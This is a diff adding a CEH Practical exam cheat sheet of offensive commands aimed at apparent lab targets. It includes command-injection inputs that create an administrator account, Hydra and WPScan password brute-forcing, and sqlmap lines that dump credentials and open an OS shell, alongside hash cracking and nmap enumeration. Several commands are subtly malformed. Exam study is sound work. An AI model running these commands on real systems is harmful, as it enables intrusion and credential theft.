@@ -1,0 +1,229 @@
+Guide for CEH-Practical Exam
+
+The file contains the Cmd's, Tools and Examples to crack the respective challenges.
+
+Gitbook Guide
+https://github.com/CyberSecurityUP/Guide-CEH-Practical-Master
+https://adithyanak.gitbook.io/ceh-practical/
+https://github.com/Samson-DVS/CEH-Practical-Notes  (Very-useful)
+https://github.com/nirangadh/ceh-practical         (Very-useful)
+https://0xdf.gitlab.io/2018/12/02/pwk-notes-smb-enumeration-checklist-update1.html  (SMB Checklist Enumeration)
+https://github.com/Samsar4/Ethical-Hacking-Labs
+https://github.com/Rezkmike/CEH_Practical_Preparation (very-useful tools)
+https://nx7.me/posts/cehreview/
+https://chirag-singla.notion.site/CEH-Practical-Preparation-7f2b77651cd144e8872f2f5a30155052
+
+IMP
+https://github.com/System-CTL/CEH_CHEAT_SHEET
+
+---------------------------------------------------------------------------------------------------------------
+
+DVWA
+
+Login to DVWA
+Set the Security Level "Low"
+Click on the Command Injection Tab 
+Check the parameter is vulnerable or not and it is vulnerable 
+Now enter the system cmd's
+| hostname
+| whoami
+| dir C:\path.txt
+| type path.txt
+
+| net user
+| net user Test /Add
+| net user
+| net user Test
+| net localgroup Administrators Test /Add
+
+Succefully created the "Test" user account.
+
+--------------------------------------------------------------------------------------------------------------------------------
+
+Cryptography
+
+Hash identifier and Hash cracking
+
+Hash Identifier
+https://www.onlinehashcrack.com/hash-identification.php
+
+Hash-identifier (CLI)
+
+Hash Crack
+https://crackstation.net/
+https://hashes.com/en/decrypt/hash
+
+Hashcat -a 3 -m 900 hash.txt /rockyou.txt
+
+-a attack mode
+-m hashtype
+900 md4
+1000 NTLM
+1800 SHA512CRYPT
+110 SHA1 with SALT HASH
+0  MD5
+100 SHA1
+1400 SHA256
+3200 BCRYPT
+160 HMAC-SHA1
+
+John 
+1. First analyze hash type - `john hashfile.hash`
+2. Then crack hash - `john hashfile.hash --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA1`
+3. Show the cracked password - `john --show --format=Raw-SHA1 hashfile.hash` OR `john --show hashfile.hash
+
+
+Hydra
+
+- **FTP**: hydra -l user -P passlist.txt [ftp://10.10.46.122](ftp://10.10.46.122/)
+    
+            hydra -L userlist.txt -P passlist.txt [ftp://10.10.46.122](ftp://10.10.46.122/)
+    
+- SSH: hydra -l <username> -P <full path to pass> 10.10.46.122 -t 4 ssh
+- Post Web Form: hydra -l <username> -P <wordlist> 10.10.46.122 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V
+
+- `hydra -L /root/Desktop/Wordlists/Usernames.txt -P /root/Desktop/Wordlists/Passwords.txt ftp://[IP]`
+- `hydra -l root -P passwords.txt [-t 32] <IP> ftp
+- `hydra -L usernames.txt -P pass.txt <IP> mysql
+- `hydra -l USERNAME -P /path/to/passwords.txt -f <IP> pop3 -V`
+- `hydra -V -f -L <userslist> -P <passwlist> ***rdp***://<IP>`
+- `hydra -P common-snmp-community-strings.txt target.com snmp
+- `hydra -l Administrator -P words.txt 192.168.1.12 smb t 1
+- `hydra -l root -P passwords.txt <IP> ssh
+
+--------------------------------------------------------------------------------------------------------------------------------------------
+
+SNMP Enumeration
+
+nmap -sU -P 161 IP
+snmp-check IP
+Displays Network Info, Network Interfaces, Network IP, Routing Info, TCP connection and listening, process, Storage info, File System and Device Info.
+
+
+NetBios Enumeration
+
+nbstat -a IP
+-a netbios name table
+-c list contents of Netbios name cache
+
+net use
+Displays connection status, Shared folder/drive and Network Information.
+
+--------------------------------------------------------------------------------------------------------------------------------------------------------
+
+NET USERS /DOMAIN >USERS.TXT
+Domain: TEST.local
+User Enumeration:
+  Windows:
+    net user
+    net user /domain
+    net user [username]
+    net user [username] /domain
+
+///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+OWASP ZAP
+Open the ZAP 
+Add the webiste name to Autoscan
+Click on the Alert tab to know about Vulnerabilities
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------
+
+SQL MAP
+
+Open the vulnerable website 
+Copy the cookie from the inspect element
+Open the terminal to use sqlmap 
+sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="mscope=1jwuydl="; --dbs
+sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="mscope=1jwuydl=; ui-tabs-1=0" -D moveiscope --tables
+sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="mscope=1jwuydl=; ui-tabs-1=0" -D moviescope -T user-Login --dump
+
+You will get all the Useraname and Passwords of the website.
+
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="mscope=1jwuydl=; ui-tabs-1=0" --os-shell
+It opens up the Interactive OS shell.
+
+-------------------------------------------------------------------------------------------------------------------------------------------------------
+
+mysql -U qdpmadmin -h 192.168.1.8 -P passwod 
+show databases;
+use qdpm;
+show tables'
+select * from users;
+show dtabases;
+use staff;
+show tables;
+select * from login;
+select * from user;
+
+When you have username and Password for the database.
+
+-------------------------------------------------------------------------------------------------------------------------------------------------------
+
+///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+NMAP
+
+nmap -sn 10.10.10.10/24 -oN nmap.txt
+nmap -sC -sV -sS -O 10.10.10.11 -oN nmap.txt
+nmap -A 10.10.10.10/24 -oN nmap.txt
+
+nmap -sn -O 172.16.43.1/24 
+nmap -sS -sC -sV -O 172.16.43.3 -oN nmap.txt
+nmap 172.16.43.1/24
+
+nmap -sV -sC -pA nmap 10.10.10.x
+nmap -sC -sV -v -oN nmap.txt 10.10.10.10
+nmap -sU -sV -A t4 -v -oN udp.txt 10.10.10.1
+
+nmap -f IP
+nmap -sn -PR IP
+nmap -sn -PE ip-range
+nmap -sn 10.10.10.10/24
+nmap -sC -sS -sV -O IP
+nmap -A IP
+
+-sn disable port scan
+-PR ARP ping scan
+-PU UDP ping scan
+-PE ICMP ECHO ping scan
+-f  Splits IP into fragment packets
+
+nmap --script smb-os-discovery.nse IP 
+Displays OS, Computer-Name, Domain, WorkGroup and Ports.
+
+
+/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+Stegnography
+
+snow.exe -C -p "test" confidential.txt
+
+-C  compressing / uncompressing
+-p  password
+
+
+Open Stego 
+GUI tool
+
+/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+WİRESHARK
+
+https://www.comparitech.com/net-admin/wireshark-cheat-sheet/
+https://www.hackers-arise.com/post/2018/09/27/network-forensics-part-2-detecting-and-analyzing-a-scada-dos-attack
+
+To find DOS (SYN and ACK) : tcp.flags.syn == 1  , tcp.flags.syn == 1 and tcp.flags.ack == 0
+To find passwords : http.request.method == POST
+
+
+/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+WordPress Brusteforce
+
+wpscan --url http://172.16.0.27:8080/CEH/ -u james -P /path/pass.txt
+wpscan --url https://example/ --enumerate u (To enumerate the user)
+
+/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
